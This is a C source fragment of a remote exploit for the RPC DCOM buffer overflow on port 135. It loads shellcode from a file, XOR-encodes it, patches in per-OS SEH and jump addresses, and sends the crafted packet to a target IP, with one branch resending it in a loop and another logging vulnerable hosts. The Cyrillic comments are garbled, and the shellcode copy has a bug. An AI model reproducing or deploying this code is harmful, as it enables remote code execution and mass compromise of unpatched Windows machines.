int attack(char *ip1,bool atack)
{
    unsigned char rawData[1036];
    memcpy(rawData,rawData1,1036);
    unsigned char shellcode[50000];
    char ip[200];
    strcpy(ip,ip1);
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[50000];
    unsigned char buf2[50000];

    printf("%s\n",ip);
    //printf("RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n");
    //printf("Code by FlashSky,Flashsky xfocus org\n");
    //printf("Welcome to our Site: http://www.xfocus.org\n");
    //printf("Welcome to our Site: http://www.venustech.com.cn\n");
    /*    if(argc!=3)
        {
              printf("%s targetIP targetOS\ntargets:\n",argv[0]);
              for(int i=0;i<sizeof(target_os)/sizeof(v);i++)
                   printf("%d - %s\n",i,target_os.target);
                   printf("\n%x\n",GETSTRCS(argv[1]));
              return;
        }
    */
    /*    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
        {
            printf("WSAStartup error.Error:%d\n",WSAGetLastError());
            return;
        }
    */
    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(ip);

    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return 0;
    }
    len1=sizeof(request1);

    len=sizeof(rawData);

    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf("%s - connect failed\n",ip);
        return 0;
    }

    int vers=!version(ip,sock);

//     printf("%d\n",vers);
//     return;
//     int vers=1;

    FILE *fp;

    //чит ем п кет
//     fp=fopen("shellcode","rb");
//     fread(rawData,1,1036,fp);
//     fclose(fp);
    //теперь нужно ссчит ть непосредственно исполняемый шеллкод!

    fp=fopen("bshell2","rb");
    int sz=fread(shellcode,1,1024,fp);
    fclose(fp);
//     printf("%d\n",sz);
    for(int i=0; i<sz; i++)
        rawData[i+0x71]=shellcode;
//     fp=fopen("badfile.exe","rb");
//     unsigned int sz1=fread(shellcode,1,50000,fp);
//     fclose(fp);
//     for(i=0;i<sz1;i++)
//          rawData[i+0x240]=shellcode;

//     fp=fopen("pac","wb");
//     fwrite(rawData,1,1036,fp);
//     fclose(fp);

//     return;


    //Перед тем к к ксорить з пишем  дрес свободного HEAP'a
//     DWORD heap=0x00180000;
//     int k=vers;
//     vers=1;
//     *(DWORD *)(rawData+0xae)=target_os[vers].heap;
    *(DWORD *)(rawData+0x71+0x1e)=target_os[vers].heap;
    //.еперь нужно проксорить н ш код, для того чтобы получить нужный н м
    XOR(rawData,0x71,sz,0x99);
//     XOR(rawData,0x240,sz1,0x99);
    //. к же н м нужно з пис ть нужный н м SEH и JMP
    DWORD seh=target_os[vers].seh;
    DWORD jmp=target_os[vers].jmp;
    *(DWORD *)(rawData+0x22a)=jmp;
    *(DWORD *)(rawData+0x22e)=seh;
//     *(WORD *)(rawData+0x62)=sz+sz1+(0x240-(0x71+sz));
    *(WORD *)(rawData+0x62)=sz;


    memcpy(buf2,request1,sizeof(request1));
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(rawData)/2;
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(rawData)/2;
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);

    memcpy(buf2+len1,rawData,sizeof(rawData));
    len1=len1+sizeof(rawData);

    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;

    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;

    closesocket(sock);
    if(atack)
    {
        sock=socket(2,1,0);
        WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL);

        if (send(sock,(const char *)bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
        {
            printf("%s - send failed %d\n",ip,WSAGetLastError());
            return 0;
        }
        else {
            printf("%s - send exploit to %s\n",ip,target_os[vers].target);
        }

        len=recv(sock,(char *)buf1,1000,NULL);
        bool ft=1;
        if(ft)
        {
            int i=0;
            while(1)
            {
                if (send(sock,(const char *)buf2,len1,0)==SOCKET_ERROR)
                {
                    printf("\nSend failed.Error:%d\n",WSAGetLastError());
                    return 0;
                }
                else
                {
                    printf("\r%d",++i);
                }
                //Sleep(1000);
            }
        }
        send(sock,(const char *)buf2,len1,0);
        closesocket(sock);
    }
    else fprintf(fp1,"%s %s\n",target_os[vers].target,ip);
//     fp=fopen("pac","wb");
//     fwrite(rawData,1,1036,fp);
//     fclose(fp);
}